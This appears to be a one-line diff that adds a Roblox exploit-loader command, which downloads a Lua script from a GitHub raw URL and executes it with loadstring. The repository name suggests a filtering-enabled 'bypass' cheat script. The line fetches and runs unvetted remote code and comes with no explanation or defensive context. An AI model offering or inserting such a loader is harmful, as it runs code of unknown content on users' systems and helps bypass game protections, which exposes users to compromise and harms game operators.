@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/S33dedL0rdzOfficial/Script.febypassrozxino/main/Main.lua'))()
